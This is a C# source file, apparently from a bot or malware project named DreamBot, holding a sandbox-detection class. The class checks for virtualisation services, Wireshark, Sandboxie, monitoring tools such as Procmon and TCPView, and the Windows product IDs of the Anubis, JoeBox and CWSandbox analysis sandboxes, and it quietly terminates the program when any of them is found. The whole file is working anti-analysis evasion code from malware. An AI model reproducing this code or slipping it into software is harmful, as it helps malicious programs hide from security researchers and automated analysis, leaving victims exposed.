using System;
using System.Diagnostics;
using System.Globalization;

namespace DreamBot.System.Evation
{
    internal class SandboxDetection
    {
        private static bool IsRunning(params string[] processes)
        {
            foreach (var p in Process.GetProcesses())
            {
                foreach (var process in processes)
                {
                    if (p.ProcessName == process)
                        return true;
                }
            }
            return false;
        }

        private static bool IsModuleLoaded(params string[] modules)
        { 
            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    foreach (ProcessModule module in process.Modules)
                    {
                        foreach (var moduleName in modules)
                        {
                            if (string.Compare(module.ModuleName, moduleName, true, CultureInfo.InvariantCulture)==0)
                                return true;
                        }
                    }
                }
                catch
                {
                }
            }
            return false;
        }

        private static bool IsSandbox(string id)
        {
            return id == SystemInfo.GetWindowsProductId();
        }

        public static void CheckIfSandboxed()
        {
            var virtualPc  = IsRunning("vpcmap", "vmsrvc", "vmusrvc"); // Virtual PC
            var virtualBox = IsRunning("VBoxService");                 // Virtual Box
            var wireshark = IsRunning("wireshark.exe");                // Wireshark
            var sandboxie = IsModuleLoaded("sbiedll.dll");             // Sandboxie
            var threatExpert = IsModuleLoaded("dbghelp.dll");          // ThreatExpert
            var anubis = IsSandbox("76487-337-8429955-22614");         // Anubis
            var joeBox = IsSandbox("55274-640-2673064-23950") ;        // JoeBox
            var cwSandbox = IsSandbox("76487-644-3177037-23510");      // CWSandbox

            var tools = IsRunning("NETSTAT", "FILEMON", "PROCMON", "REGMON", "CAIN", "NETMON", "TCPVIEW");
 
            if(virtualBox || virtualPc || wireshark || sandboxie || anubis || joeBox || cwSandbox || tools)
            {
                Environment.Exit(0);
            }
        }
    }
}
